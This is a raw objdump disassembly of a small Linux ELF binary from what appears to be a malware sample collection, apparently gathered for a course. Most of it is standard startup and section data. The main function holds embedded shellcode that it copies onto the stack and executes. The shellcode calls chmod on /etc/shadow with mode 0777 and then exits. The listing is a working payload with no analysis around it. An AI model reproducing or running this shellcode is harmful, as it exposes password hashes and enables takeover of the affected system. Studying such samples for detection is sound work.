
/home/stas/Coursach/Выборки/compiled/viruses/37392:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 ae 40 fe 4f 38    	add    %ch,0x384ffe40(%esi)
 804819d:	e9 a5 20 23 5e       	jmp    6627a247 <_end+0x5e2301ff>
 80481a2:	78 fc                	js     80481a0 <_init-0x1a0>
 80481a4:	d8 0f                	fmuls  (%edi)
 80481a6:	bb 3b 78 63 94       	mov    $0x9463783b,%ebx
 80481ab:	7b                   	.byte 0x7b

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	06                   	push   %es
 80481b1:	00 00                	add    %al,(%eax)
 80481b3:	00 01                	add    %al,(%ecx)
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	23 00                	and    (%eax),%eax
 80481bf:	20 06                	and    %al,(%esi)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 07                	add    %al,(%edi)
 80481c5:	00 00                	add    %al,(%eax)
 80481c7:	00 29                	add    %ch,(%ecx)
 80481c9:	1d 8c 1c ad 4b       	sbb    $0x4bad1c8c,%eax
 80481ce:	e3 c0                	jecxz  8048190 <_init-0x1b0>

Дизассемблирование раздела .dynsym:

080481d0 <.dynsym>:
	...
 80481e0:	1a 00                	sbb    (%eax),%al
	...
 80481ea:	00 00                	add    %al,(%eax)
 80481ec:	12 00                	adc    (%eax),%al
 80481ee:	00 00                	add    %al,(%eax)
 80481f0:	53                   	push   %ebx
	...
 80481f9:	00 00                	add    %al,(%eax)
 80481fb:	00 20                	add    %ah,(%eax)
 80481fd:	00 00                	add    %al,(%eax)
 80481ff:	00 2b                	add    %ch,(%ebx)
	...
 8048209:	00 00                	add    %al,(%eax)
 804820b:	00 12                	add    %dl,(%edx)
 804820d:	00 00                	add    %al,(%eax)
 804820f:	00 41 00             	add    %al,0x0(%ecx)
	...
 804821a:	00 00                	add    %al,(%eax)
 804821c:	12 00                	adc    (%eax),%al
 804821e:	00 00                	add    %al,(%eax)
 8048220:	39 00                	cmp    %eax,(%eax)
	...
 804822a:	00 00                	add    %al,(%eax)
 804822c:	12 00                	adc    (%eax),%al
 804822e:	00 00                	add    %al,(%eax)
 8048230:	32 00                	xor    (%eax),%al
 8048232:	00 00                	add    %al,(%eax)
 8048234:	40                   	inc    %eax
 8048235:	a0 04 08 04 00       	mov    0x40804,%al
 804823a:	00 00                	add    %al,(%eax)
 804823c:	11 00                	adc    %eax,(%eax)
 804823e:	19 00                	sbb    %eax,(%eax)
 8048240:	0b 00                	or     (%eax),%eax
 8048242:	00 00                	add    %al,(%eax)
 8048244:	0c 86                	or     $0x86,%al
 8048246:	04 08                	add    $0x8,%al
 8048248:	04 00                	add    $0x0,%al
 804824a:	00 00                	add    %al,(%eax)
 804824c:	11 00                	adc    %eax,(%eax)
 804824e:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

08048250 <.dynstr>:
 8048250:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048254:	63 2e                	arpl   %bp,(%esi)
 8048256:	73 6f                	jae    80482c7 <_init-0x79>
 8048258:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 804825d:	4f                   	dec    %edi
 804825e:	5f                   	pop    %edi
 804825f:	73 74                	jae    80482d5 <_init-0x6b>
 8048261:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048268:	64 
 8048269:	00 5f 5f             	add    %bl,0x5f(%edi)
 804826c:	73 74                	jae    80482e2 <_init-0x5e>
 804826e:	61                   	popa   
 804826f:	63 6b 5f             	arpl   %bp,0x5f(%ebx)
 8048272:	63 68 6b             	arpl   %bp,0x6b(%eax)
 8048275:	5f                   	pop    %edi
 8048276:	66 61                	popaw  
 8048278:	69 6c 00 73 74 72 6c 	imul   $0x656c7274,0x73(%eax,%eax,1),%ebp
 804827f:	65 
 8048280:	6e                   	outsb  %ds:(%esi),(%dx)
 8048281:	00 73 74             	add    %dh,0x74(%ebx)
 8048284:	64 6f                	outsl  %fs:(%esi),(%dx)
 8048286:	75 74                	jne    80482fc <_init-0x44>
 8048288:	00 66 70             	add    %ah,0x70(%esi)
 804828b:	72 69                	jb     80482f6 <_init-0x4a>
 804828d:	6e                   	outsb  %ds:(%esi),(%dx)
 804828e:	74 66                	je     80482f6 <_init-0x4a>
 8048290:	00 5f 5f             	add    %bl,0x5f(%edi)
 8048293:	6c                   	insb   (%dx),%es:(%edi)
 8048294:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 804829b:	72 74                	jb     8048311 <_init-0x2f>
 804829d:	5f                   	pop    %edi
 804829e:	6d                   	insl   (%dx),%es:(%edi)
 804829f:	61                   	popa   
 80482a0:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 80482a7:	6f                   	outsl  %ds:(%esi),(%dx)
 80482a8:	6e                   	outsb  %ds:(%esi),(%dx)
 80482a9:	5f                   	pop    %edi
 80482aa:	73 74                	jae    8048320 <_init-0x20>
 80482ac:	61                   	popa   
 80482ad:	72 74                	jb     8048323 <_init-0x1d>
 80482af:	5f                   	pop    %edi
 80482b0:	5f                   	pop    %edi
 80482b1:	00 47 4c             	add    %al,0x4c(%edi)
 80482b4:	49                   	dec    %ecx
 80482b5:	42                   	inc    %edx
 80482b6:	43                   	inc    %ebx
 80482b7:	5f                   	pop    %edi
 80482b8:	32 2e                	xor    (%esi),%ch
 80482ba:	30 00                	xor    %al,(%eax)
 80482bc:	47                   	inc    %edi
 80482bd:	4c                   	dec    %esp
 80482be:	49                   	dec    %ecx
 80482bf:	42                   	inc    %edx
 80482c0:	43                   	inc    %ebx
 80482c1:	5f                   	pop    %edi
 80482c2:	32 2e                	xor    (%esi),%ch
 80482c4:	34 00                	xor    $0x0,%al

Дизассемблирование раздела .gnu.version:

080482c6 <.gnu.version>:
 80482c6:	00 00                	add    %al,(%eax)
 80482c8:	02 00                	add    (%eax),%al
 80482ca:	00 00                	add    %al,(%eax)
 80482cc:	03 00                	add    (%eax),%eax
 80482ce:	03 00                	add    (%eax),%eax
 80482d0:	03 00                	add    (%eax),%eax
 80482d2:	03 00                	add    (%eax),%eax
 80482d4:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

080482d8 <.gnu.version_r>:
 80482d8:	01 00                	add    %eax,(%eax)
 80482da:	02 00                	add    (%eax),%al
 80482dc:	01 00                	add    %eax,(%eax)
 80482de:	00 00                	add    %al,(%eax)
 80482e0:	10 00                	adc    %al,(%eax)
 80482e2:	00 00                	add    %al,(%eax)
 80482e4:	00 00                	add    %al,(%eax)
 80482e6:	00 00                	add    %al,(%eax)
 80482e8:	10 69 69             	adc    %ch,0x69(%ecx)
 80482eb:	0d 00 00 03 00       	or     $0x30000,%eax
 80482f0:	62 00                	bound  %eax,(%eax)
 80482f2:	00 00                	add    %al,(%eax)
 80482f4:	10 00                	adc    %al,(%eax)
 80482f6:	00 00                	add    %al,(%eax)
 80482f8:	14 69                	adc    $0x69,%al
 80482fa:	69 0d 00 00 02 00 6c 	imul   $0x6c,0x20000,%ecx
 8048301:	00 00 00 
 8048304:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .rel.dyn:

08048308 <.rel.dyn>:
 8048308:	fc                   	cld    
 8048309:	9f                   	lahf   
 804830a:	04 08                	add    $0x8,%al
 804830c:	06                   	push   %es
 804830d:	02 00                	add    (%eax),%al
 804830f:	00 40 a0             	add    %al,-0x60(%eax)
 8048312:	04 08                	add    $0x8,%al
 8048314:	05                   	.byte 0x5
 8048315:	06                   	push   %es
	...

Дизассемблирование раздела .rel.plt:

08048318 <.rel.plt>:
 8048318:	0c a0                	or     $0xa0,%al
 804831a:	04 08                	add    $0x8,%al
 804831c:	07                   	pop    %es
 804831d:	01 00                	add    %eax,(%eax)
 804831f:	00 10                	add    %dl,(%eax)
 8048321:	a0 04 08 07 02       	mov    0x2070804,%al
 8048326:	00 00                	add    %al,(%eax)
 8048328:	14 a0                	adc    $0xa0,%al
 804832a:	04 08                	add    $0x8,%al
 804832c:	07                   	pop    %es
 804832d:	03 00                	add    (%eax),%eax
 804832f:	00 18                	add    %bl,(%eax)
 8048331:	a0 04 08 07 04       	mov    0x4070804,%al
 8048336:	00 00                	add    %al,(%eax)
 8048338:	1c a0                	sbb    $0xa0,%al
 804833a:	04 08                	add    $0x8,%al
 804833c:	07                   	pop    %es
 804833d:	05                   	.byte 0x5
	...

Дизассемблирование раздела .init:

08048340 <_init>:
 8048340:	53                   	push   %ebx
 8048341:	83 ec 08             	sub    $0x8,%esp
 8048344:	e8 b7 00 00 00       	call   8048400 <__x86.get_pc_thunk.bx>
 8048349:	81 c3 b7 1c 00 00    	add    $0x1cb7,%ebx
 804834f:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 8048355:	85 c0                	test   %eax,%eax
 8048357:	74 05                	je     804835e <_init+0x1e>
 8048359:	e8 32 00 00 00       	call   8048390 <__gmon_start__@plt>
 804835e:	83 c4 08             	add    $0x8,%esp
 8048361:	5b                   	pop    %ebx
 8048362:	c3                   	ret    

Дизассемблирование раздела .plt:

08048370 <__stack_chk_fail@plt-0x10>:
 8048370:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048376:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804837c:	00 00                	add    %al,(%eax)
	...

08048380 <__stack_chk_fail@plt>:
 8048380:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048386:	68 00 00 00 00       	push   $0x0
 804838b:	e9 e0 ff ff ff       	jmp    8048370 <_init+0x30>

08048390 <__gmon_start__@plt>:
 8048390:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048396:	68 08 00 00 00       	push   $0x8
 804839b:	e9 d0 ff ff ff       	jmp    8048370 <_init+0x30>

080483a0 <strlen@plt>:
 80483a0:	ff 25 14 a0 04 08    	jmp    *0x804a014
 80483a6:	68 10 00 00 00       	push   $0x10
 80483ab:	e9 c0 ff ff ff       	jmp    8048370 <_init+0x30>

080483b0 <__libc_start_main@plt>:
 80483b0:	ff 25 18 a0 04 08    	jmp    *0x804a018
 80483b6:	68 18 00 00 00       	push   $0x18
 80483bb:	e9 b0 ff ff ff       	jmp    8048370 <_init+0x30>

080483c0 <fprintf@plt>:
 80483c0:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 80483c6:	68 20 00 00 00       	push   $0x20
 80483cb:	e9 a0 ff ff ff       	jmp    8048370 <_init+0x30>

Дизассемблирование раздела .text:

080483d0 <_start>:
 80483d0:	31 ed                	xor    %ebp,%ebp
 80483d2:	5e                   	pop    %esi
 80483d3:	89 e1                	mov    %esp,%ecx
 80483d5:	83 e4 f0             	and    $0xfffffff0,%esp
 80483d8:	50                   	push   %eax
 80483d9:	54                   	push   %esp
 80483da:	52                   	push   %edx
 80483db:	68 f0 85 04 08       	push   $0x80485f0
 80483e0:	68 80 85 04 08       	push   $0x8048580
 80483e5:	51                   	push   %ecx
 80483e6:	56                   	push   %esi
 80483e7:	68 cd 84 04 08       	push   $0x80484cd
 80483ec:	e8 bf ff ff ff       	call   80483b0 <__libc_start_main@plt>
 80483f1:	f4                   	hlt    
 80483f2:	66 90                	xchg   %ax,%ax
 80483f4:	66 90                	xchg   %ax,%ax
 80483f6:	66 90                	xchg   %ax,%ax
 80483f8:	66 90                	xchg   %ax,%ax
 80483fa:	66 90                	xchg   %ax,%ax
 80483fc:	66 90                	xchg   %ax,%ax
 80483fe:	66 90                	xchg   %ax,%ax

08048400 <__x86.get_pc_thunk.bx>:
 8048400:	8b 1c 24             	mov    (%esp),%ebx
 8048403:	c3                   	ret    
 8048404:	66 90                	xchg   %ax,%ax
 8048406:	66 90                	xchg   %ax,%ax
 8048408:	66 90                	xchg   %ax,%ax
 804840a:	66 90                	xchg   %ax,%ax
 804840c:	66 90                	xchg   %ax,%ax
 804840e:	66 90                	xchg   %ax,%ax

08048410 <deregister_tm_clones>:
 8048410:	b8 2b a0 04 08       	mov    $0x804a02b,%eax
 8048415:	2d 28 a0 04 08       	sub    $0x804a028,%eax
 804841a:	83 f8 06             	cmp    $0x6,%eax
 804841d:	77 01                	ja     8048420 <deregister_tm_clones+0x10>
 804841f:	c3                   	ret    
 8048420:	b8 00 00 00 00       	mov    $0x0,%eax
 8048425:	85 c0                	test   %eax,%eax
 8048427:	74 f6                	je     804841f <deregister_tm_clones+0xf>
 8048429:	55                   	push   %ebp
 804842a:	89 e5                	mov    %esp,%ebp
 804842c:	83 ec 18             	sub    $0x18,%esp
 804842f:	c7 04 24 28 a0 04 08 	movl   $0x804a028,(%esp)
 8048436:	ff d0                	call   *%eax
 8048438:	c9                   	leave  
 8048439:	c3                   	ret    
 804843a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

08048440 <register_tm_clones>:
 8048440:	b8 28 a0 04 08       	mov    $0x804a028,%eax
 8048445:	2d 28 a0 04 08       	sub    $0x804a028,%eax
 804844a:	c1 f8 02             	sar    $0x2,%eax
 804844d:	89 c2                	mov    %eax,%edx
 804844f:	c1 ea 1f             	shr    $0x1f,%edx
 8048452:	01 d0                	add    %edx,%eax
 8048454:	d1 f8                	sar    %eax
 8048456:	75 01                	jne    8048459 <register_tm_clones+0x19>
 8048458:	c3                   	ret    
 8048459:	ba 00 00 00 00       	mov    $0x0,%edx
 804845e:	85 d2                	test   %edx,%edx
 8048460:	74 f6                	je     8048458 <register_tm_clones+0x18>
 8048462:	55                   	push   %ebp
 8048463:	89 e5                	mov    %esp,%ebp
 8048465:	83 ec 18             	sub    $0x18,%esp
 8048468:	89 44 24 04          	mov    %eax,0x4(%esp)
 804846c:	c7 04 24 28 a0 04 08 	movl   $0x804a028,(%esp)
 8048473:	ff d2                	call   *%edx
 8048475:	c9                   	leave  
 8048476:	c3                   	ret    
 8048477:	89 f6                	mov    %esi,%esi
 8048479:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048480 <__do_global_dtors_aux>:
 8048480:	80 3d 44 a0 04 08 00 	cmpb   $0x0,0x804a044
 8048487:	75 13                	jne    804849c <__do_global_dtors_aux+0x1c>
 8048489:	55                   	push   %ebp
 804848a:	89 e5                	mov    %esp,%ebp
 804848c:	83 ec 08             	sub    $0x8,%esp
 804848f:	e8 7c ff ff ff       	call   8048410 <deregister_tm_clones>
 8048494:	c6 05 44 a0 04 08 01 	movb   $0x1,0x804a044
 804849b:	c9                   	leave  
 804849c:	f3 c3                	repz ret 
 804849e:	66 90                	xchg   %ax,%ax

080484a0 <frame_dummy>:
 80484a0:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 80484a5:	85 c0                	test   %eax,%eax
 80484a7:	74 1f                	je     80484c8 <frame_dummy+0x28>
 80484a9:	b8 00 00 00 00       	mov    $0x0,%eax
 80484ae:	85 c0                	test   %eax,%eax
 80484b0:	74 16                	je     80484c8 <frame_dummy+0x28>
 80484b2:	55                   	push   %ebp
 80484b3:	89 e5                	mov    %esp,%ebp
 80484b5:	83 ec 18             	sub    $0x18,%esp
 80484b8:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 80484bf:	ff d0                	call   *%eax
 80484c1:	c9                   	leave  
 80484c2:	e9 79 ff ff ff       	jmp    8048440 <register_tm_clones>
 80484c7:	90                   	nop
 80484c8:	e9 73 ff ff ff       	jmp    8048440 <register_tm_clones>

080484cd <main>:
 80484cd:	55                   	push   %ebp
 80484ce:	89 e5                	mov    %esp,%ebp
 80484d0:	83 e4 f0             	and    $0xfffffff0,%esp
 80484d3:	83 ec 40             	sub    $0x40,%esp
 80484d6:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 80484dc:	89 44 24 3c          	mov    %eax,0x3c(%esp)
 80484e0:	31 c0                	xor    %eax,%eax
 80484e2:	c7 44 24 11 6a 0f 58 	movl   $0x68580f6a,0x11(%esp)
 80484e9:	68 
 80484ea:	c7 44 24 15 90 90 ff 	movl   $0x1ff9090,0x15(%esp)
 80484f1:	01 
 80484f2:	c7 44 24 19 59 c1 e9 	movl   $0x10e9c159,0x19(%esp)
 80484f9:	10 
 80484fa:	c7 44 24 1d 68 90 64 	movl   $0x6f649068,0x1d(%esp)
 8048501:	6f 
 8048502:	c7 44 24 21 77 5b c1 	movl   $0xebc15b77,0x21(%esp)
 8048509:	eb 
 804850a:	c7 44 24 25 08 53 68 	movl   $0x2f685308,0x25(%esp)
 8048511:	2f 
 8048512:	c7 44 24 29 73 68 61 	movl   $0x68616873,0x29(%esp)
 8048519:	68 
 804851a:	c7 44 24 2d 2f 65 74 	movl   $0x6374652f,0x2d(%esp)
 8048521:	63 
 8048522:	c7 44 24 31 89 e3 cd 	movl   $0x80cde389,0x31(%esp)
 8048529:	80 
 804852a:	c7 44 24 35 b0 01 b3 	movl   $0x1b301b0,0x35(%esp)
 8048531:	01 
 8048532:	66 c7 44 24 39 cd 80 	movw   $0x80cd,0x39(%esp)
 8048539:	c6 44 24 3b 00       	movb   $0x0,0x3b(%esp)
 804853e:	8d 44 24 11          	lea    0x11(%esp),%eax
 8048542:	89 04 24             	mov    %eax,(%esp)
 8048545:	e8 56 fe ff ff       	call   80483a0 <strlen@plt>
 804854a:	8b 15 40 a0 04 08    	mov    0x804a040,%edx
 8048550:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048554:	c7 44 24 04 10 86 04 	movl   $0x8048610,0x4(%esp)
 804855b:	08 
 804855c:	89 14 24             	mov    %edx,(%esp)
 804855f:	e8 5c fe ff ff       	call   80483c0 <fprintf@plt>
 8048564:	8d 44 24 11          	lea    0x11(%esp),%eax
 8048568:	ff d0                	call   *%eax
 804856a:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
 804856e:	65 33 0d 14 00 00 00 	xor    %gs:0x14,%ecx
 8048575:	74 05                	je     804857c <main+0xaf>
 8048577:	e8 04 fe ff ff       	call   8048380 <__stack_chk_fail@plt>
 804857c:	c9                   	leave  
 804857d:	c3                   	ret    
 804857e:	66 90                	xchg   %ax,%ax

08048580 <__libc_csu_init>:
 8048580:	55                   	push   %ebp
 8048581:	57                   	push   %edi
 8048582:	31 ff                	xor    %edi,%edi
 8048584:	56                   	push   %esi
 8048585:	53                   	push   %ebx
 8048586:	e8 75 fe ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 804858b:	81 c3 75 1a 00 00    	add    $0x1a75,%ebx
 8048591:	83 ec 1c             	sub    $0x1c,%esp
 8048594:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 8048598:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804859e:	e8 9d fd ff ff       	call   8048340 <_init>
 80485a3:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 80485a9:	29 c6                	sub    %eax,%esi
 80485ab:	c1 fe 02             	sar    $0x2,%esi
 80485ae:	85 f6                	test   %esi,%esi
 80485b0:	74 27                	je     80485d9 <__libc_csu_init+0x59>
 80485b2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 80485b8:	8b 44 24 38          	mov    0x38(%esp),%eax
 80485bc:	89 2c 24             	mov    %ebp,(%esp)
 80485bf:	89 44 24 08          	mov    %eax,0x8(%esp)
 80485c3:	8b 44 24 34          	mov    0x34(%esp),%eax
 80485c7:	89 44 24 04          	mov    %eax,0x4(%esp)
 80485cb:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 80485d2:	83 c7 01             	add    $0x1,%edi
 80485d5:	39 f7                	cmp    %esi,%edi
 80485d7:	75 df                	jne    80485b8 <__libc_csu_init+0x38>
 80485d9:	83 c4 1c             	add    $0x1c,%esp
 80485dc:	5b                   	pop    %ebx
 80485dd:	5e                   	pop    %esi
 80485de:	5f                   	pop    %edi
 80485df:	5d                   	pop    %ebp
 80485e0:	c3                   	ret    
 80485e1:	eb 0d                	jmp    80485f0 <__libc_csu_fini>
 80485e3:	90                   	nop
 80485e4:	90                   	nop
 80485e5:	90                   	nop
 80485e6:	90                   	nop
 80485e7:	90                   	nop
 80485e8:	90                   	nop
 80485e9:	90                   	nop
 80485ea:	90                   	nop
 80485eb:	90                   	nop
 80485ec:	90                   	nop
 80485ed:	90                   	nop
 80485ee:	90                   	nop
 80485ef:	90                   	nop

080485f0 <__libc_csu_fini>:
 80485f0:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

080485f4 <_fini>:
 80485f4:	53                   	push   %ebx
 80485f5:	83 ec 08             	sub    $0x8,%esp
 80485f8:	e8 03 fe ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 80485fd:	81 c3 03 1a 00 00    	add    $0x1a03,%ebx
 8048603:	83 c4 08             	add    $0x8,%esp
 8048606:	5b                   	pop    %ebx
 8048607:	c3                   	ret    

Дизассемблирование раздела .rodata:

08048608 <_fp_hw>:
 8048608:	03 00                	add    (%eax),%eax
	...

0804860c <_IO_stdin_used>:
 804860c:	01 00                	add    %eax,(%eax)
 804860e:	02 00                	add    (%eax),%al
 8048610:	4c                   	dec    %esp
 8048611:	65 6e                	outsb  %gs:(%esi),(%dx)
 8048613:	67 74 68             	addr16 je 804867e <_IO_stdin_used+0x72>
 8048616:	3a 20                	cmp    (%eax),%ah
 8048618:	25 64 0a 0a 00       	and    $0xa0a64,%eax

Дизассемблирование раздела .eh_frame_hdr:

08048620 <.eh_frame_hdr>:
 8048620:	01 1b                	add    %ebx,(%ebx)
 8048622:	03 3b                	add    (%ebx),%edi
 8048624:	28 00                	sub    %al,(%eax)
 8048626:	00 00                	add    %al,(%eax)
 8048628:	04 00                	add    $0x0,%al
 804862a:	00 00                	add    %al,(%eax)
 804862c:	50                   	push   %eax
 804862d:	fd                   	std    
 804862e:	ff                   	(bad)  
 804862f:	ff 44 00 00          	incl   0x0(%eax,%eax,1)
 8048633:	00 ad fe ff ff 68    	add    %ch,0x68fffffe(%ebp)
 8048639:	00 00                	add    %al,(%eax)
 804863b:	00 60 ff             	add    %ah,-0x1(%eax)
 804863e:	ff                   	(bad)  
 804863f:	ff 88 00 00 00 d0    	decl   -0x30000000(%eax)
 8048645:	ff                   	(bad)  
 8048646:	ff                   	(bad)  
 8048647:	ff c4                	inc    %esp
 8048649:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

0804864c <__FRAME_END__-0xac>:
 804864c:	14 00                	adc    $0x0,%al
 804864e:	00 00                	add    %al,(%eax)
 8048650:	00 00                	add    %al,(%eax)
 8048652:	00 00                	add    %al,(%eax)
 8048654:	01 7a 52             	add    %edi,0x52(%edx)
 8048657:	00 01                	add    %al,(%ecx)
 8048659:	7c 08                	jl     8048663 <_IO_stdin_used+0x57>
 804865b:	01 1b                	add    %ebx,(%ebx)
 804865d:	0c 04                	or     $0x4,%al
 804865f:	04 88                	add    $0x88,%al
 8048661:	01 00                	add    %eax,(%eax)
 8048663:	00 20                	add    %ah,(%eax)
 8048665:	00 00                	add    %al,(%eax)
 8048667:	00 1c 00             	add    %bl,(%eax,%eax,1)
 804866a:	00 00                	add    %al,(%eax)
 804866c:	04 fd                	add    $0xfd,%al
 804866e:	ff                   	(bad)  
 804866f:	ff 60 00             	jmp    *0x0(%eax)
 8048672:	00 00                	add    %al,(%eax)
 8048674:	00 0e                	add    %cl,(%esi)
 8048676:	08 46 0e             	or     %al,0xe(%esi)
 8048679:	0c 4a                	or     $0x4a,%al
 804867b:	0f 0b                	ud2    
 804867d:	74 04                	je     8048683 <_IO_stdin_used+0x77>
 804867f:	78 00                	js     8048681 <_IO_stdin_used+0x75>
 8048681:	3f                   	aas    
 8048682:	1a 3b                	sbb    (%ebx),%bh
 8048684:	2a 32                	sub    (%edx),%dh
 8048686:	24 22                	and    $0x22,%al
 8048688:	1c 00                	sbb    $0x0,%al
 804868a:	00 00                	add    %al,(%eax)
 804868c:	40                   	inc    %eax
 804868d:	00 00                	add    %al,(%eax)
 804868f:	00 3d fe ff ff b1    	add    %bh,0xb1fffffe
 8048695:	00 00                	add    %al,(%eax)
 8048697:	00 00                	add    %al,(%eax)
 8048699:	41                   	inc    %ecx
 804869a:	0e                   	push   %cs
 804869b:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 80486a1:	02 ad c5 0c 04 04    	add    0x4040cc5(%ebp),%ch
 80486a7:	00 38                	add    %bh,(%eax)
 80486a9:	00 00                	add    %al,(%eax)
 80486ab:	00 60 00             	add    %ah,0x0(%eax)
 80486ae:	00 00                	add    %al,(%eax)
 80486b0:	d0 fe                	sar    %dh
 80486b2:	ff                   	(bad)  
 80486b3:	ff 61 00             	jmp    *0x0(%ecx)
 80486b6:	00 00                	add    %al,(%eax)
 80486b8:	00 41 0e             	add    %al,0xe(%ecx)
 80486bb:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 80486c1:	87 03                	xchg   %eax,(%ebx)
 80486c3:	43                   	inc    %ebx
 80486c4:	0e                   	push   %cs
 80486c5:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 80486cb:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 80486d2:	0e                   	push   %cs
 80486d3:	14 41                	adc    $0x41,%al
 80486d5:	c3                   	ret    
 80486d6:	0e                   	push   %cs
 80486d7:	10 41 c6             	adc    %al,-0x3a(%ecx)
 80486da:	0e                   	push   %cs
 80486db:	0c 41                	or     $0x41,%al
 80486dd:	c7                   	(bad)  
 80486de:	0e                   	push   %cs
 80486df:	08 41 c5             	or     %al,-0x3b(%ecx)
 80486e2:	0e                   	push   %cs
 80486e3:	04 10                	add    $0x10,%al
 80486e5:	00 00                	add    %al,(%eax)
 80486e7:	00 9c 00 00 00 04 ff 	add    %bl,-0xfc0000(%eax,%eax,1)
 80486ee:	ff                   	(bad)  
 80486ef:	ff 02                	incl   (%edx)
 80486f1:	00 00                	add    %al,(%eax)
 80486f3:	00 00                	add    %al,(%eax)
 80486f5:	00 00                	add    %al,(%eax)
	...

080486f8 <__FRAME_END__>:
 80486f8:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	a0                   	.byte 0xa0
 8049f09:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	80                   	.byte 0x80
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	40                   	inc    %eax
 8049f21:	83 04 08 0d          	addl   $0xd,(%eax,%ecx,1)
 8049f25:	00 00                	add    %al,(%eax)
 8049f27:	00 f4                	add    %dh,%ah
 8049f29:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8049f2c:	19 00                	sbb    %eax,(%eax)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
